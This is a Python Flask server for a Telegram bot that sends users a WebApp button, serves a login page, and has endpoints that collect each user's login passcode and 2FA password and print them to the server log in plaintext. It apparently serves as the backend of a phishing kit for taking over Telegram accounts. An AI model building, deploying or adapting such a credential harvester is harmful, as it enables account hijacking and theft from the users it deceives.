from flask import Flask, request, jsonify, render_template
import requests
import os

app = Flask(__name__)

# === CONFIGURATION ===
BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    raise RuntimeError("❌ BOT_TOKEN not set in environment variables")

TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
APP_URL = os.environ.get("APP_URL", "https://tgbot-gllp.onrender.com")


# === SETUP WEBHOOK (run once) ===
@app.route("/setup_webhook")
def setup_webhook():
    """Set up Telegram webhook (visit once after deployment)"""
    webhook_url = f"{APP_URL}/"
    response = requests.post(f"{TELEGRAM_API}/setWebhook", json={"url": webhook_url})
    return jsonify({
        "webhook_url": webhook_url,
        "telegram_response": response.json()
    })


@app.route("/webhook_info")
def webhook_info():
    """Check current webhook status"""
    response = requests.get(f"{TELEGRAM_API}/getWebhookInfo")
    return jsonify(response.json())


# === TELEGRAM WEBHOOK ===
@app.route("/", methods=["POST"])
def webhook():
    """Main Telegram webhook handler"""
    update = request.get_json(force=True, silent=True)
    print("=" * 60, flush=True)
    print("📨 Received Telegram update:", update, flush=True)
    print("=" * 60, flush=True)

    if not update or "message" not in update:
        return jsonify({"ok": True})

    message = update["message"]
    chat_id = message["chat"]["id"]
    text = message.get("text", "")

    if text == "/start":
        webapp_url = f"{APP_URL}/webapp"
        keyboard = {
            "inline_keyboard": [[{
                "text": "🌐 Open WebApp",
                "web_app": {"url": webapp_url}
            }]]
        }

        payload = {
            "chat_id": chat_id,
            "text": "👋 Welcome!\n\nTap below to open the WebApp 👇",
            "reply_markup": keyboard
        }

        res = requests.post(f"{TELEGRAM_API}/sendMessage", json=payload)
        print("📤 Telegram API response:", res.text, flush=True)

    return jsonify({"ok": True})


# === FRONTEND ROUTES ===
@app.route("/webapp")
def webapp_page():
    return render_template("index.html")

@app.route("/login")
def login_screen():
    return render_template("login.html")


# === WEBAPP DATA HANDLERS ===
@app.route("/send_data", methods=["POST"])
def send_data():
    """Receive passcode from WebApp"""
    data = request.get_json()
    user_id = data.get("user_id")
    passcode = data.get("passcode")

    print("=" * 60, flush=True)
    print("📨 Received from WebApp:", flush=True)
    print(f"   User ID: {user_id}", flush=True)
    print(f"   Passcode: {passcode}", flush=True)
    print("=" * 60, flush=True)

    # Optionally send a confirmation back to Telegram user
    if user_id and passcode:
        try:
            requests.post(f"{TELEGRAM_API}/sendMessage", json={
                "chat_id": user_id,
                "text": "✅ Passcode received successfully!"
            })
        except Exception as e:
            print(f"❌ Telegram send error: {e}", flush=True)

    return jsonify({"ok": True})


@app.route("/send_twofactor", methods=["POST"])
def send_twofactor():
    """Receive 2FA password from WebApp"""
    data = request.get_json()
    user_id = data.get("user_id")
    twofactor = data.get("twofactor")

    print("=" * 60, flush=True)
    print("🔐 Received 2FA:", flush=True)
    print(f"   User ID: {user_id}", flush=True)
    print(f"   2FA: {twofactor}", flush=True)
    print("=" * 60, flush=True)

    if user_id and twofactor:
        try:
            requests.post(f"{TELEGRAM_API}/sendMessage", json={
                "chat_id": user_id,
                "text": "🔐 2FA password received!"
            })
        except Exception as e:
            print(f"❌ Telegram send error: {e}", flush=True)

    return jsonify({"ok": True})


# === STATUS PAGE ===
@app.route("/status")
def status():
    bot_status = "✅ BOT_TOKEN set" if BOT_TOKEN else "❌ Missing BOT_TOKEN"
    return f"""
    <h1>Telegram Bot Server</h1>
    <p>{bot_status}</p>
    <p>🌐 WebApp URL: <a href="{APP_URL}/webapp">{APP_URL}/webapp</a></p>
    <p><a href="/webhook_info">Check Webhook</a></p>
    <p><a href="/setup_webhook">Setup Webhook</a></p>
    """


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
